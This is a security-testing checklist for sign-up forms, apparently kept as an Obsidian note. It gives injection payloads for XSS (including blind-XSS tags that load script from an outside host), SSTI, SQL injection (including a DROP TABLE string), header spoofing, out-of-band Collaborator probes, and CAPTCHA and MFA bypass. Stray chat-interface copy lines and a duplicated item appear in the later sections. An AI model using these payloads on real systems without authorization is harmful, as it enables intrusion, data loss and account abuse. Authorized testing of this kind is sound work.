Enhanced Checklist for Sign Up Vulnerabilities in Obsidian

This checklist is sorted by the potential vulnerability type and includes example payloads and additional notes. You can use it in Obsidian by checking the boxes as you test each item.

General Vulnerability Categories

1. Sensitive Information Disclosure

[ ] Existing Email Address Reflection:

Payload: email=existing@gmail.com

Note: Check for authorization tokens or other sensitive information reflected in the response.

[ ] Company Email Address Reflection:

Payload: email=admin@company.com

Note: Check if this grants extra authorities or functionalities.

[ ] Company Email Address Variations:

Payloads: admin@company.com (with space), admin@COMPANY.COM, admin@gmail.com@company.com, me+(@gmail.com)@company.com, "me@gmail.com"@company.com, <me@gmail.com>"@company.com, "me@gmail.com;"@company.com, "me@gmail.com+"@company.com

Note: Test these variations for potential access control bypass or sensitive information disclosure.

[ ] Large String Injection:

Payload: Inject large strings (50,000+ characters) into POST parameters.

Note: Monitor for errors, which may reveal sensitive information.

[ ] Retrieve Data From Deleted Account:

Payload: Use the email address associated with a previously deleted account for sign up.

Note: Attempt to recover data from the deleted account.

2. Cross-Site Scripting (XSS)

[ ] XSS Through Email Address:

Payloads:

me+(<script>alert(0)</script>)@gmail.com

me(<script>alert(0)</script>)@gmail.com

me@gmail(<script>alert(0)</script>).com

"<script>alert(0)</script>"@gmail.com

%@gmail.com

Note: Test these payloads in email addresses, usernames, first/last names, and password fields.

[ ] Blind XSS:

Payloads:

"><script src=//me.xss.ht></script>

<img src="//me.xss.ht">

Note: Test in first/last names, password fields, and user-agent headers.

3. Server-Side Template Injection (SSTI)

[ ] SSTI Through Email Address:

Payloads:

"<%= 7 * 7 %>"@gmail.com

me+(${{7*7}})@gmail.com

Note: Test these payloads in email addresses, usernames, first/last names, and password fields.

[ ] SSTI Through Fields:

Payloads:

{{7*7}}, {7*7}, ${{7*7}}

Note: Test these payloads in first name, last name, and username fields.

[ ] SSTI Through Reflection:

Payload: <% (to check for reflection in email body)

Note: If <% is reflected, try injecting <%= 7 * 7 %> for SSTI.

4. SQL Injection (SQLi)

[ ] SQLi Through Email Address:

Payloads:

"' OR 1=1 -- '"@gmail.com

"me); DROP TABLE users;--"@gmail.com

Note: Test these payloads in email addresses, usernames, first/last names, and password fields.

[ ] SQLi Through User-Agent:

Payload: Mozilla/5.0' AND '1' = '2

Note: Test this in the user-agent header.

[ ] Time-Based SQLi:

Payload: ";WAITFOR DELAY '0.0.20'--

Note: Test this in the X-Forwarded-For header.

5. Command Injection

[ ] Command Injection:

Payload: email=me@whoami.id.collaborator.net

Note: Use Burp Collaborator and monitor for back-end information or internal IPs.

6. Authentication Bypass

[ ] Company Email Address Bypass:

Payload: admin@company.com

Note: Try accessing all endpoints without verifying the account.

[ ] Spoofing Host Header:

Payload: X-Forwarded-Host: me.com

Note: Test this if the company accepts the company email but doesn't activate the account.

7. Brute Force

[ ] Brute Force Account Creation:

Payload: email=me@gmail.com&password=********

Note: Use brute force tools to create multiple accounts or enumerate email addresses.

8. Race Conditions

[ ] Race Condition Sign-Up:

Payload: email=m&password=********&Invitation=Random (for invitation-based signup)

Note: Use automation to create multiple accounts with a single invitation.

9. Mobile-Number Verification

- Note: If the site uses mobile verification, investigate OTP expiration, response manipulation, and UUID tampering.
- **[ ] OTP Expiration:** Test if OTPs expire and how.
- **[ ] Response Manipulation:** Test manipulating the response after a wrong mobile number is entered.
- **[ ] UUID Tampering:** Attempt to change UUIDs in the response to gain access to other accounts.
content_copy
Use code with caution.

10. CSRF

- Note: If no CSRF token or protection is present, attempt to craft a CSRF PoC.
- **[ ] CSRF Vulnerability:** Attempt to craft a CSRF PoC.
content_copy
Use code with caution.

11. Hidden Character Injection

- Payload: `bob%00` or `%01bob`
- Note: Inject invisible range characters (%00 to %FF) into usernames or emails.
- **[ ] Hidden Character Injection:** Test this technique.
content_copy
Use code with caution.

12. Time-Based SQLi

- Payload: `";WAITFOR DELAY '0.0.20'--`
- Note: Test this in X-Forwarded-For header.
- **[ ] Time-Based SQLi:** Test this technique.
content_copy
Use code with caution.

13. Other Checks

- **[ ] Birthday Field Manipulation:** Test setting birthdays to today or tomorrow for potential birthday discounts.
- **[ ] Password Field Manipulation:** 
  - Payload: `%01%E2%80%AEalert%0D%0A` 
  - Note: Check for behavior if using only `%01`, logging in without CRLF, and if trela is accepted instead of alert.
- **[ ] True/Null/Undefined Values:** Test these values in usernames and other fields for potential errors.
content_copy
Use code with caution.

14. Burp Collaborator Techniques

[ ] Burp Collaborator for Backend Information:

Payloads:

me@id.collaborator.net

me@[id.collaborator.net]

user(;me@id.collaborator.net)@gmail.com

me@id.collaborator.net(@gmail.com)

me+(@gmail.com)@id.collaborator.net

<me@id.collaborator.net>user@gmail.com

Note: Use Burp Collaborator and monitor for back-end information or internal IPs.

[ ] Burp Collaborator for RCE:

Payload: email=me@whoami.id.collaborator.net

Note: Use Burp Collaborator and monitor for back-end information or internal IPs.

15. Additional Vulnerability Categories

[ ] Email Address Manipulation:

Payload: me+1@gmail.com, me+2@gmail.com, me+ANYSTRING@gmail.com

Note: Test these variations to see if multiple accounts can be created.

[ ] ReCAPTCHA Bypass:

Payload: Configure TLS Pass Through for Google reCAPTCHA in Burp Suite.

Note: Test if reCAPTCHA can be bypassed by intercepting and modifying the request.

[ ] Rate Limiting:

Payload: Send multiple sign-up requests in a short period.

Note: Check if the application has rate limiting in place to prevent abuse.

[ ] Session Fixation:

Payload: Set a session cookie before the user logs in and check if the session is maintained.

Note: Test if the application is vulnerable to session fixation attacks.

[ ] Insecure Direct Object References (IDOR):

Payload: Modify the user ID or email in the request to access other users' data.

Note: Test if the application properly validates user access to resources.

[ ] Weak Password Policies:

Payload: Use common weak passwords like 123456, password, qwerty, etc.

Note: Check if the application enforces strong password policies.

[ ] Account Enumeration:

Payload: Use common usernames and emails to see if the application reveals the existence of accounts.

Note: Test if the application provides different responses for existing and non-existing accounts.

[ ] Multi-Factor Authentication (MFA) Bypass:

Payload: Attempt to bypass MFA by intercepting and modifying the request.

Note: Test if the application properly enforces MFA.

Important Notes

Use Burp Suite: Use Burp Suite for intercepting requests and responses, creating payloads, and setting up TLS Pass Through for Google reCAPTCHA bypass.

Collaborator Server: Leverage Burp Collaborator for detecting back-end information, internal IPs, and blind XSS.

Security Best Practices: Always follow security best practices and consult with your organization's security team before testing these techniques on production systems.

Remember: This checklist provides a starting point for exploring sign-up vulnerabilities. It is not exhaustive and may need to be customized depending on the specific application.

This checklist is designed for use in Obsidian, but it can also be useful in other documentation tools or for manual testing.
